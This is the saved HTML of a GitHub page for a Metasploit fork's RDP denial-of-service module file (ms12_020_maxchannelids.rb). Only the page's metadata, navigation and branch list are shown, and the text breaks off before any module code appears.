


<!DOCTYPE html>
<html>
  <head prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# githubog: http://ogp.me/ns/fb/githubog#">
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>metasploit-framework/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb at 5dcff47b1efa5359562a28b5717a9f4895185597 · jvazquez-r7/metasploit-framework · GitHub</title>
    <link rel="search" type="application/opensearchdescription+xml" href="/opensearch.xml" title="GitHub" />
    <link rel="fluid-icon" href="https://github.com/fluidicon.png" title="GitHub" />
    <link rel="apple-touch-icon" sizes="57x57" href="/apple-touch-icon-114.png" />
    <link rel="apple-touch-icon" sizes="114x114" href="/apple-touch-icon-114.png" />
    <link rel="apple-touch-icon" sizes="72x72" href="/apple-touch-icon-144.png" />
    <link rel="apple-touch-icon" sizes="144x144" href="/apple-touch-icon-144.png" />
    <link rel="logo" type="image/svg" href="https://github-media-downloads.s3.amazonaws.com/github-logo.svg" />
    <meta property="og:image" content="https://github.global.ssl.fastly.net/images/modules/logos_page/Octocat.png">
    <meta name="hostname" content="github-fe114-cp1-prd.iad.github.net">
    <meta name="ruby" content="ruby 1.9.3p194-tcs-github-tcmalloc (2012-05-25, TCS patched 2012-05-27, GitHub v1.0.36) [x86_64-linux]">
    <link rel="assets" href="https://github.global.ssl.fastly.net/">
    <link rel="conduit-xhr" href="https://ghconduit.com:25035/">
    <link rel="xhr-socket" href="/_sockets" />
    


    <meta name="msapplication-TileImage" content="/windows-tile.png" />
    <meta name="msapplication-TileColor" content="#ffffff" />
    <meta name="selected-link" value="repo_source" data-pjax-transient />
    <meta content="collector.githubapp.com" name="octolytics-host" /><meta content="github" name="octolytics-app-id" /><meta content="2720634E:3B8F:10541808:525933B6" name="octolytics-dimension-request_id" />
    

    
    
    <link rel="icon" type="image/x-icon" href="/favicon.ico" />

    <meta content="authenticity_token" name="csrf-param" />
<meta content="M4XyCMcKTHmBuLOsN3oOUkYCToVxegq7ewiWH3QVqsI=" name="csrf-token" />

    <link href="https://github.global.ssl.fastly.net/assets/github-1c7dbb8d7b87dc092768f2d88b14ab1038cb1fa3.css" media="all" rel="stylesheet" type="text/css" />
    <link href="https://github.global.ssl.fastly.net/assets/github2-d1457f7530b4fbdf863344e647db192927f12c58.css" media="all" rel="stylesheet" type="text/css" />
    

    

      <script src="https://github.global.ssl.fastly.net/assets/frameworks-5036c64d838328b79e082f548848e2898412e869.js" type="text/javascript"></script>
      <script src="https://github.global.ssl.fastly.net/assets/github-0818b6c0fb5cc21fd7ee0062b133b12cabe1d086.js" type="text/javascript"></script>
      
      <meta http-equiv="x-pjax-version" content="143789be21832e509e3d1d798edd37fc">

        <link data-pjax-transient rel='permalink' href='/jvazquez-r7/metasploit-framework/blob/5dcff47b1efa5359562a28b5717a9f4895185597/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb'>
  <meta property="og:title" content="metasploit-framework"/>
  <meta property="og:type" content="githubog:gitrepository"/>
  <meta property="og:url" content="https://github.com/jvazquez-r7/metasploit-framework"/>
  <meta property="og:image" content="https://github.global.ssl.fastly.net/images/gravatars/gravatar-user-420.png"/>
  <meta property="og:site_name" content="GitHub"/>
  <meta property="og:description" content="metasploit-framework - Metasploit Framework"/>

  <meta name="description" content="metasploit-framework - Metasploit Framework" />

  <meta content="1742838" name="octolytics-dimension-user_id" /><meta content="jvazquez-r7" name="octolytics-dimension-user_login" /><meta content="6786012" name="octolytics-dimension-repository_id" /><meta content="jvazquez-r7/metasploit-framework" name="octolytics-dimension-repository_nwo" /><meta content="true" name="octolytics-dimension-repository_public" /><meta content="true" name="octolytics-dimension-repository_is_fork" /><meta content="2293158" name="octolytics-dimension-repository_parent_id" /><meta content="rapid7/metasploit-framework" name="octolytics-dimension-repository_parent_nwo" /><meta content="2293158" name="octolytics-dimension-repository_network_root_id" /><meta content="rapid7/metasploit-framework" name="octolytics-dimension-repository_network_root_nwo" />
  <link href="https://github.com/jvazquez-r7/metasploit-framework/commits/5dcff47b1efa5359562a28b5717a9f4895185597.atom" rel="alternate" title="Recent Commits to metasploit-framework:5dcff47b1efa5359562a28b5717a9f4895185597" type="application/atom+xml" />

  </head>


  <body class="logged_out  env-production  vis-public fork  page-blob">
    <div class="wrapper">
      
      
      


      
      <div class="header header-logged-out">
  <div class="container clearfix">

    <a class="header-logo-wordmark" href="https://github.com/">
      <span class="mega-octicon octicon-logo-github"></span>
    </a>

    <div class="header-actions">
        <a class="button primary" href="/signup">Sign up</a>
      <a class="button signin" href="/login?return_to=%2Fjvazquez-r7%2Fmetasploit-framework%2Fblob%2F5dcff47b1efa5359562a28b5717a9f4895185597%2Fmodules%2Fauxiliary%2Fdos%2Fwindows%2Frdp%2Fms12_020_maxchannelids.rb">Sign in</a>
    </div>

    <div class="command-bar js-command-bar  in-repository">

      <ul class="top-nav">
          <li class="explore"><a href="/explore">Explore</a></li>
        <li class="features"><a href="/features">Features</a></li>
          <li class="enterprise"><a href="https://enterprise.github.com/">Enterprise</a></li>
          <li class="blog"><a href="/blog">Blog</a></li>
      </ul>
        <form accept-charset="UTF-8" action="/search" class="command-bar-form" id="top_search_form" method="get">

<input type="text" data-hotkey="/ s" name="q" id="js-command-bar-field" placeholder="Search or type a command" tabindex="1" autocapitalize="off"
    
    
      data-repo="jvazquez-r7/metasploit-framework"
      data-branch="5dcff47b1efa5359562a28b5717a9f4895185597"
      data-sha="8a2f1f522a5e81eb258378a73feb62acab6f874f"
  >

    <input type="hidden" name="nwo" value="jvazquez-r7/metasploit-framework" />

    <div class="select-menu js-menu-container js-select-menu search-context-select-menu">
      <span class="minibutton select-menu-button js-menu-target">
        <span class="js-select-button">This repository</span>
      </span>

      <div class="select-menu-modal-holder js-menu-content js-navigation-container">
        <div class="select-menu-modal">

          <div class="select-menu-item js-navigation-item js-this-repository-navigation-item selected">
            <span class="select-menu-item-icon octicon octicon-check"></span>
            <input type="radio" class="js-search-this-repository" name="search_target" value="repository" checked="checked" />
            <div class="select-menu-item-text js-select-button-text">This repository</div>
          </div> <!-- /.select-menu-item -->

          <div class="select-menu-item js-navigation-item js-all-repositories-navigation-item">
            <span class="select-menu-item-icon octicon octicon-check"></span>
            <input type="radio" name="search_target" value="global" />
            <div class="select-menu-item-text js-select-button-text">All repositories</div>
          </div> <!-- /.select-menu-item -->

        </div>
      </div>
    </div>

  <span class="octicon help tooltipped downwards" title="Show command bar help">
    <span class="octicon octicon-question"></span>
  </span>


  <input type="hidden" name="ref" value="cmdform">

</form>
    </div>

  </div>
</div>


      


          <div class="site" itemscope itemtype="http://schema.org/WebPage">
    
    <div class="pagehead repohead instapaper_ignore readability-menu">
      <div class="container">
        

<ul class="pagehead-actions">


  <li>
  <a href="/login?return_to=%2Fjvazquez-r7%2Fmetasploit-framework"
  class="minibutton with-count js-toggler-target star-button entice tooltipped upwards"
  title="You must be signed in to use this feature" rel="nofollow">
  <span class="octicon octicon-star"></span>Star
</a>
<a class="social-count js-social-count" href="/jvazquez-r7/metasploit-framework/stargazers">
  1
</a>

  </li>

    <li>
      <a href="/login?return_to=%2Fjvazquez-r7%2Fmetasploit-framework"
        class="minibutton with-count js-toggler-target fork-button entice tooltipped upwards"
        title="You must be signed in to fork a repository" rel="nofollow">
        <span class="octicon octicon-git-branch"></span>Fork
      </a>
      <a href="/jvazquez-r7/metasploit-framework/network" class="social-count">
        1,217
      </a>
    </li>
</ul>

        <h1 itemscope itemtype="http://data-vocabulary.org/Breadcrumb" class="entry-title public">
          <span class="repo-label"><span>public</span></span>
          <span class="mega-octicon octicon-repo"></span>
          <span class="author">
            <a href="/jvazquez-r7" class="url fn" itemprop="url" rel="author"><span itemprop="title">jvazquez-r7</span></a>
          </span>
          <span class="repohead-name-divider">/</span>
          <strong><a href="/jvazquez-r7/metasploit-framework" class="js-current-repository js-repo-home-link">metasploit-framework</a></strong>

          <span class="page-context-loader">
            <img alt="Octocat-spinner-32" height="16" src="https://github.global.ssl.fastly.net/images/spinners/octocat-spinner-32.gif" width="16" />
          </span>

            <span class="fork-flag">
              <span class="text">forked from <a href="/rapid7/metasploit-framework">rapid7/metasploit-framework</a></span>
            </span>
        </h1>
      </div><!-- /.container -->
    </div><!-- /.repohead -->

    <div class="container">

      <div class="repository-with-sidebar repo-container ">

        <div class="repository-sidebar">
            

<div class="repo-nav repo-nav-full js-repository-container-pjax js-octicon-loaders">
  <div class="repo-nav-contents">
    <ul class="repo-menu">
      <li class="tooltipped leftwards" title="Code">
        <a href="/jvazquez-r7/metasploit-framework" aria-label="Code" class="js-selected-navigation-item selected" data-gotokey="c" data-pjax="true" data-selected-links="repo_source repo_downloads repo_commits repo_tags repo_branches /jvazquez-r7/metasploit-framework">
          <span class="octicon octicon-code"></span> <span class="full-word">Code</span>
          <img alt="Octocat-spinner-32" class="mini-loader" height="16" src="https://github.global.ssl.fastly.net/images/spinners/octocat-spinner-32.gif" width="16" />
</a>      </li>


      <li class="tooltipped leftwards" title="Pull Requests"><a href="/jvazquez-r7/metasploit-framework/pulls" aria-label="Pull Requests" class="js-selected-navigation-item js-disable-pjax" data-gotokey="p" data-selected-links="repo_pulls /jvazquez-r7/metasploit-framework/pulls">
            <span class="octicon octicon-git-pull-request"></span> <span class="full-word">Pull Requests</span>
            <span class='counter'>1</span>
            <img alt="Octocat-spinner-32" class="mini-loader" height="16" src="https://github.global.ssl.fastly.net/images/spinners/octocat-spinner-32.gif" width="16" />
</a>      </li>


    </ul>
    <div class="repo-menu-separator"></div>
    <ul class="repo-menu">

      <li class="tooltipped leftwards" title="Pulse">
        <a href="/jvazquez-r7/metasploit-framework/pulse" aria-label="Pulse" class="js-selected-navigation-item " data-pjax="true" data-selected-links="pulse /jvazquez-r7/metasploit-framework/pulse">
          <span class="octicon octicon-pulse"></span> <span class="full-word">Pulse</span>
          <img alt="Octocat-spinner-32" class="mini-loader" height="16" src="https://github.global.ssl.fastly.net/images/spinners/octocat-spinner-32.gif" width="16" />
</a>      </li>

      <li class="tooltipped leftwards" title="Graphs">
        <a href="/jvazquez-r7/metasploit-framework/graphs" aria-label="Graphs" class="js-selected-navigation-item " data-pjax="true" data-selected-links="repo_graphs repo_contributors /jvazquez-r7/metasploit-framework/graphs">
          <span class="octicon octicon-graph"></span> <span class="full-word">Graphs</span>
          <img alt="Octocat-spinner-32" class="mini-loader" height="16" src="https://github.global.ssl.fastly.net/images/spinners/octocat-spinner-32.gif" width="16" />
</a>      </li>

      <li class="tooltipped leftwards" title="Network">
        <a href="/jvazquez-r7/metasploit-framework/network" aria-label="Network" class="js-selected-navigation-item js-disable-pjax" data-selected-links="repo_network /jvazquez-r7/metasploit-framework/network">
          <span class="octicon octicon-git-branch"></span> <span class="full-word">Network</span>
          <img alt="Octocat-spinner-32" class="mini-loader" height="16" src="https://github.global.ssl.fastly.net/images/spinners/octocat-spinner-32.gif" width="16" />
</a>      </li>
    </ul>


  </div>
</div>

            <div class="only-with-full-nav">
              

  

<div class="clone-url open"
  data-protocol-type="http"
  data-url="/users/set_protocol?protocol_selector=http&amp;protocol_type=clone">
  <h3><strong>HTTPS</strong> clone URL</h3>
  <div class="clone-url-box">
    <input type="text" class="clone js-url-field"
           value="https://github.com/jvazquez-r7/metasploit-framework.git" readonly="readonly">

    <span class="js-zeroclipboard url-box-clippy minibutton zeroclipboard-button" data-clipboard-text="https://github.com/jvazquez-r7/metasploit-framework.git" data-copied-hint="copied!" title="copy to clipboard"><span class="octicon octicon-clippy"></span></span>
  </div>
</div>

  

<div class="clone-url "
  data-protocol-type="subversion"
  data-url="/users/set_protocol?protocol_selector=subversion&amp;protocol_type=clone">
  <h3><strong>Subversion</strong> checkout URL</h3>
  <div class="clone-url-box">
    <input type="text" class="clone js-url-field"
           value="https://github.com/jvazquez-r7/metasploit-framework" readonly="readonly">

    <span class="js-zeroclipboard url-box-clippy minibutton zeroclipboard-button" data-clipboard-text="https://github.com/jvazquez-r7/metasploit-framework" data-copied-hint="copied!" title="copy to clipboard"><span class="octicon octicon-clippy"></span></span>
  </div>
</div>


<p class="clone-options">You can clone with
      <a href="#" class="js-clone-selector" data-protocol="http">HTTPS</a>,
      or <a href="#" class="js-clone-selector" data-protocol="subversion">Subversion</a>.
  <span class="octicon help tooltipped upwards" title="Get help on which URL is right for you.">
    <a href="https://help.github.com/articles/which-remote-url-should-i-use">
    <span class="octicon octicon-question"></span>
    </a>
  </span>
</p>



              <a href="/jvazquez-r7/metasploit-framework/archive/5dcff47b1efa5359562a28b5717a9f4895185597.zip"
                 class="minibutton sidebar-button"
                 title="Download this repository as a zip file"
                 rel="nofollow">
                <span class="octicon octicon-cloud-download"></span>
                Download ZIP
              </a>
            </div>
        </div><!-- /.repository-sidebar -->

        <div id="js-repo-pjax-container" class="repository-content context-loader-container" data-pjax-container>
          


<!-- blob contrib key: blob_contributors:v21:37b846eca7869335328b7ac6181df7cc -->

<p title="This is a placeholder element" class="js-history-link-replace hidden"></p>

<a href="/jvazquez-r7/metasploit-framework/find/5dcff47b1efa5359562a28b5717a9f4895185597" data-pjax data-hotkey="t" class="js-show-file-finder" style="display:none">Show File Finder</a>

<div class="file-navigation">
  
  

<div class="select-menu js-menu-container js-select-menu" >
  <span class="minibutton select-menu-button js-menu-target" data-hotkey="w"
    data-master-branch="master"
    data-ref=""
    role="button" aria-label="Switch branches or tags" tabindex="0">
    <span class="octicon octicon-git-branch"></span>
    <i>tree:</i>
    <span class="js-select-button">5dcff47b1e</span>
  </span>

  <div class="select-menu-modal-holder js-menu-content js-navigation-container" data-pjax>

    <div class="select-menu-modal">
      <div class="select-menu-header">
        <span class="select-menu-title">Switch branches/tags</span>
        <span class="octicon octicon-remove-close js-menu-close"></span>
      </div> <!-- /.select-menu-header -->

      <div class="select-menu-filters">
        <div class="select-menu-text-filter">
          <input type="text" aria-label="Filter branches/tags" id="context-commitish-filter-field" class="js-filterable-field js-navigation-enable" placeholder="Filter branches/tags">
        </div>
        <div class="select-menu-tabs">
          <ul>
            <li class="select-menu-tab">
              <a href="#" data-tab-filter="branches" class="js-select-menu-tab">Branches</a>
            </li>
            <li class="select-menu-tab">
              <a href="#" data-tab-filter="tags" class="js-select-menu-tab">Tags</a>
            </li>
          </ul>
        </div><!-- /.select-menu-tabs -->
      </div><!-- /.select-menu-filters -->

      <div class="select-menu-list select-menu-tab-bucket js-select-menu-tab-bucket" data-tab-filter="branches">

        <div data-filterable-for="context-commitish-filter-field" data-filterable-type="substring">


            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/3vi1john-file_collector/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="3vi1john-file_collector"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="3vi1john-file_collector">3vi1john-file_collector</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/403labs-post-pgpass_creds/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="403labs-post-pgpass_creds"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="403labs-post-pgpass_creds">403labs-post-pgpass_creds</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/CVE-2013-1814/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="CVE-2013-1814"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="CVE-2013-1814">CVE-2013-1814</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/CWE/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="CWE"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="CWE">CWE</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/ChrisJohnRiley-concrete5_member_list/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="ChrisJohnRiley-concrete5_member_list"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="ChrisJohnRiley-concrete5_member_list">ChrisJohnRiley-concrete5_member_list</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/ChrisJohnRiley-sip_invite_spoof/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="ChrisJohnRiley-sip_invite_spoof"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="ChrisJohnRiley-sip_invite_spoof">ChrisJohnRiley-sip_invite_spoof</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/Datacut-master/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="Datacut-master"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="Datacut-master">Datacut-master</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/LittleLightLittleFire-module-cve-2012-1723/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="LittleLightLittleFire-module-cve-2012-1723"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="LittleLightLittleFire-module-cve-2012-1723">LittleLightLittleFire-module-cve-2012-1723</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/Meatballs1-smb_login/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="Meatballs1-smb_login"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="Meatballs1-smb_login">Meatballs1-smb_login</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/Meatballs1-uplay/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="Meatballs1-uplay"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="Meatballs1-uplay">Meatballs1-uplay</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/WinRM/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="WinRM"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="WinRM">WinRM</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/account_methods_keyring/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="account_methods_keyring"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="account_methods_keyring">account_methods_keyring</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/actfax_raw_bof/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="actfax_raw_bof"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="actfax_raw_bof">actfax_raw_bof</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/add_doc_stager/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="add_doc_stager"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="add_doc_stager">add_doc_stager</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/add-kaminari-to-gemcache/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="add-kaminari-to-gemcache"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="add-kaminari-to-gemcache">add-kaminari-to-gemcache</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/add_ms13_071_info/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="add_ms13_071_info"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="add_ms13_071_info">add_ms13_071_info</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/adobe_sandbox_adobecollabsync/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="adobe_sandbox_adobecollabsync"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="adobe_sandbox_adobecollabsync">adobe_sandbox_adobecollabsync</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/apache_rave_creds/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="apache_rave_creds"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="apache_rave_creds">apache_rave_creds</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/apache_rave_creds_2/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="apache_rave_creds_2"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="apache_rave_creds_2">apache_rave_creds_2</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/apple_quicktime_mime_type/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="apple_quicktime_mime_type"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="apple_quicktime_mime_type">apple_quicktime_mime_type</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/apple_quicktime_rdrf_refs/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="apple_quicktime_rdrf_refs"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="apple_quicktime_rdrf_refs">apple_quicktime_rdrf_refs</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/apple_quicktime_texml_font_table/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="apple_quicktime_texml_font_table"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="apple_quicktime_texml_font_table">apple_quicktime_texml_font_table</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/arkeia_refs/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="arkeia_refs"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="arkeia_refs">arkeia_refs</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/arm_stagers/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="arm_stagers"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="arm_stagers">arm_stagers</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/arm_stagers_cleanup/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="arm_stagers_cleanup"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="arm_stagers_cleanup">arm_stagers_cleanup</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/audio_coder_m3u/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="audio_coder_m3u"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="audio_coder_m3u">audio_coder_m3u</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/auth_brute_patch/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="auth_brute_patch"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="auth_brute_patch">auth_brute_patch</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/axigen_file_access/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="axigen_file_access"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="axigen_file_access">axigen_file_access</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/bcoles-cuteflow_2.11.2_upload_exec/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="bcoles-cuteflow_2.11.2_upload_exec"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="bcoles-cuteflow_2.11.2_upload_exec">bcoles-cuteflow_2.11.2_upload_exec</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/bcoles-openfiler_networkcard_exec/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="bcoles-openfiler_networkcard_exec"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="bcoles-openfiler_networkcard_exec">bcoles-openfiler_networkcard_exec</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/bcoles-qnx_qconn_exec/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
